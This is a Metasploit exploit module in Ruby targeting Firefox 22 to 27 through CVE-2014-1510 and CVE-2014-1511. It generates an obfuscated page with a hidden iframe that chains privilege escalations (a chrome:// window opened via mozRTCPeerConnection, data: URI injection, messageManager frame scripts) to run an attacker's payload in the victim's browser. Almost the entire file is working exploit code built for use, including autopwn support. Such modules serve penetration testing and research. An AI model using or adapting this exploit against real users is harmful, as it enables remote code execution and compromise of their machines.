##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/exploitation/jsobfu'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  autopwn_info({
    :ua_name    => HttpClients::FF,
    :ua_maxver  => "22.0",
    :ua_maxver  => "27.0",
    :javascript => true,
    :rank       => ExcellentRanking
  })

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Firefox WebIDL Privileged Javascript Injection',
      'Description'    => %q{
        This exploit gains remote code execution on Firefox 22-27 by abusing two
        separate privilege escalation vulnerabilities in Firefox's Javascript
        APIs.
      },
      'License' => MSF_LICENSE,
      'Author'  => [
        'Marius Mlynski', # discovery and pwn2own exploit
        'joev' # metasploit module
      ],
      'DisclosureDate' => "Mar 17 2014",
      'References' => [
        ['CVE', '2014-1510'], # open chrome:// url in iframe
        ['CVE', '2014-1511']  # bypass popup blocker to load bare ChromeWindow
      ],
      'Targets' => [
        [
          'Universal (Javascript XPCOM Shell)', {
            'Platform' => 'firefox',
            'Arch' => ARCH_FIREFOX
          }
        ],
        [
          'Native Payload', {
            'Platform' => %w{ java linux osx solaris win },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'DefaultTarget' => 0,
      'BrowserRequirements' => {
        :source  => 'script',
        :ua_name => HttpClients::FF,
        :ua_ver  => lambda { |ver| ver.to_i.between?(22, 27) }
      }
    ))

    register_options([
      OptString.new('CONTENT', [ false, "Content to display inside the HTML <body>.", "" ])
    ], self.class)
  end

  def on_request_exploit(cli, request, target_info)
    send_response_html(cli, generate_html(target_info))
  end

  def generate_html(target_info)
    key = Rex::Text.rand_text_alpha(5 + rand(12))
    frame = Rex::Text.rand_text_alpha(5 + rand(12))
    r = Rex::Text.rand_text_alpha(5 + rand(12))
    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin
    data_uri = "data:text/html,<script>c = new mozRTCPeerConnection;c.createOffer(function()"+
               "{},function(){top.vvv=window.open('chrome://browser/content/browser.xul', "+
               "'#{r}', 'chrome,top=-9999px,left=-9999px,height=100px,width=100px');})<\/script>"

    js = Rex::Exploitation::JSObfu.new(%Q|
      var opts = #{JSON.unparse(opts)};
      var key = opts['#{key}'];

      // Load the chrome-privileged browser XUL script into an iframe
      var c = new mozRTCPeerConnection;
      c.createOffer(function(){},function(){
        window.open('chrome://browser/content/browser.xul', '#{frame}');
        step1();
      });

      // Inject a data: URI into an internal frame inside of the browser
      // XUL script to pop open a new window with the chrome flag to prevent
      // the new window from being wrapped with browser XUL;
      function step1() {
        var clear = setInterval(function(){

          // throws until frames[0].frames[2] is available (when chrome:// iframe loads)
          frames[0].frames[2].location;

          // we base64 this to avoid the script tag screwing up things when obfuscated
          frames[0].frames[2].location=window.atob('#{Rex::Text.encode_base64(data_uri)}');
          clearInterval(clear);
          setTimeout(step2, 100);
        },10);
      }

      // Step 2: load the chrome-level window up with a data URI, which
      // gives us same-origin. Make sure to load an "<iframe mozBrowser>"
      // into the frame, since that will respond to our messageManager
      // (this is important later)
      function step2() {
        var clear = setInterval(function(){
          top.vvv.location = 'data:text/html,<html><body><iframe mozBrowser '+
                             'src="about:blank"></iframe></body></html>';
          clearInterval(clear);
          setTimeout(step3, 100);
        }, 10);
      }

      function step3() {
        var clear = setInterval(function(){
          if (!frames[0]) return; // will throw until the frame is accessible
          top.vvv.messageManager.loadFrameScript('data:,'+key, false);
          clearInterval(clear);
          setTimeout(function(){top.vvv.close();}, 100);
        }, 10);
      }

    |)

    js.obfuscate

    %Q|
      <!doctype html>
      <html>
        <body>
          <iframe id='#{frame}' name='#{frame}'
                  style='position:absolute;left:-9999999px;height:1px;width:1px;'>
          </iframe>
          <script>
            #{js}
          </script>
          #{datastore['CONTENT']}
        </body>
      </html>
    |
  end
end
